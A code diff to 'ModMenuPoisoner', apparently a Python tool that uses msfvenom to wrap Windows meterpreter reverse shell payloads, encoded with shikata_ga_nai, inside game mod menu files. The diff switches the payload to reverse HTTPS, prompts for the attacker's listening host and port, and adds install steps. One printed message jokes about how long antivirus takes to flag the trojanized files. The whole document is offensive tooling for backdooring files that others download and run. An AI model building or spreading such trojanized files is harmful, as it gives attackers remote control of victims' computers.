@@ -11,9 +11,9 @@ import sys
 import StringIO
 sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen
 
-payload_Generate = 'windows/meterpreter_reverse_tcp'
-LHOST = '8.8.8.8'
-LPORT = '443'
+payload_Generate = 'windows/meterpreter_reverse_https'
+LHOST = str(raw_input("Enter LHOST (or 8.8.8.8 if you don't care): "))
+LPORT = str(raw_input("Enter LPORT (usually 443 is good enough): "))
 # input_Mod_Menu = str(raw_input("Enter the full path of the Mod Menu file: "))
 bad_Bytes = 'x00'
 payload_Encoder = 'x86/shikata_ga_nai'
@@ -43,7 +43,7 @@ def poison_mod():
     )
     print 'Now running command: ' + cmd_String
     os.system(cmd_String)
-    
+
     print 'DISCLAIMER: Please wait up to 2 weeks so that all the AV solutions will begin accusing it of being a virus and get it auto-deleted on their machines'
     main()
 
@@ -58,13 +58,28 @@ def open_dir():
     main()
 
 def setup():
+    # Git Clone
+    print 'Git cloning newest copy of Poisoner, please wait'
+    os.chdir('/tmp')
+    os.system('git clone https://github.com/tanc7/ModMenuPoisoner')
+
+    # make directories
+    print 'Making required directories'
+    os.system('mkdir /root/ModMenuPoisoner')
     os.system('mkdir /root/Documents/ModMenusReencoded/')
-    os.system('chmod 777 /root/ModMenuPoisoner/*')
-    os.system('cp -r /root/ModMenuPoisoner/ModMenuPoisoner.py /usr/local/bin')
+    # chmod executables
+    os.system('chmod 777 ./*')
+    # copy to new install directory
+    os.system('cp -r ./* /root/ModMenuPoisoner')
+    # Copy to usr/local/bin
+    print 'Adding executable to /usr/local/bin'
+    os.system('cp -r ModMenuPoisoner.py /usr/local/bin')
+
+    output_Dir = '/root/Documents/ModMenusReencoded' # This is the directory for output msfvenom payloads
+    # print setup complete
     print 'Setup complete'
     print 'For future reference, your reencoded mod menus will be located at: ' + output_Dir
     print 'You can run Mod Menu Poisoner Now on terminal by typing: ModMenuPoisoner.py'
-    main()
 
 def no_encoder():
     input_Mod_Menu = str(raw_input("Enter the full path of the Mod Menu file: "))
